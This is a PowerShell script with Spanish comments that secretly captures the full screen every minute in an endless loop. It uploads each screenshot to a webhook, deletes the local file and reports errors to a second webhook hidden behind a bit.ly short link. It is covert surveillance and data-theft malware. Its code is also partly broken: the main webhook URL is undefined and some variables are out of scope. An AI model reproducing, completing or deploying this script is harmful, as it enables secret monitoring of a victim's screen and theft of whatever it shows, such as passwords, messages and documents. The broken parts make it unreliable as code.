# Función para enviar mensajes de error al webhook secundario
function SendErrorLogToSecondaryWebhook {
    param(
        [string]$errorMessage
    )
    try {
        $secondaryWebhookUrl = "https://bit.ly/web_chupacabras"  # URL del webhook secundario
        Invoke-WebRequest -Uri $secondaryWebhookUrl -Method Post -Body "{""error"":""$errorMessage""}" -ContentType "application/json" -ErrorAction Stop
    } catch {
        Write-Host "Error al enviar registro de error al webhook secundario: $_"
    }
}

# Función para crear la carpeta temporal si no existe
function CreateTempFolder {
    $TempFolder = "$env:temp\sysw"
    if (-not (Test-Path -Path $TempFolder)) {
        try {
            Write-Host "Creando carpeta temporal..."
            New-Item -ItemType Directory -Path $TempFolder -ErrorAction Stop | Out-Null
        } catch {
            SendErrorLogToSecondaryWebhook -errorMessage "Error al crear la carpeta temporal: $_"
            return $false
        }
    }
    return $true
}

# Función para tomar una captura de pantalla
function TakeScreenshot {
    try {
        # Crea un objeto Bitmap para la captura de pantalla
        $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
        $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
        $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
        
        # Guarda la captura de pantalla en un archivo temporal
        $Filett = "$TempFolder\SC$counter.png"
        $bitmap.Save($Filett, [System.Drawing.Imaging.ImageFormat]::png)
        
        # Incrementa el contador
        $counter++
    } catch {
        SendErrorLogToSecondaryWebhook -errorMessage "Error al tomar la captura de pantalla: $_"
    }
}

# Configuración inicial
$Width = $Height = $Left = $Top = $counter = 0

# Ejecuta la función para crear la carpeta temporal
if (!(CreateTempFolder)) {
    Write-Host "No se pudo crear la carpeta temporal."
    exit
}

# Obtiene la resolución de la pantalla
try {
    $Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
    $Width = $Screen.Width
    $Height = $Screen.Height
    $Left = $Screen.Left
    $Top = $Screen.Top
} catch {
    SendErrorLogToSecondaryWebhook -errorMessage "Error al obtener la resolución de la pantalla: $_"
    exit
}

# Ejecución principal
while ($true) {
    # Realiza la captura de pantalla
    TakeScreenshot

    # Si se ha tomado una captura de pantalla, envía el archivo
    if ($counter -gt 0) {
        try {
            Write-Host "Enviando imágenes..."
            Get-ChildItem -Path $TempFolder -Filter "*.png" | ForEach-Object {
                Invoke-WebRequest -Uri $mainWebhookUrl -Method Post -InFile $_.FullName -ErrorAction Stop
                Remove-Item -Path $_.FullName -Force
            }
            $counter = 0
        } catch {
            SendErrorLogToSecondaryWebhook -errorMessage "Error al enviar las imágenes al webhook: $_"
        }
    }

    # Espera antes de tomar la próxima captura de pantalla
    Start-Sleep -Seconds 60  # Espera 60 segundos (1 minuto) antes de tomar la próxima captura
}

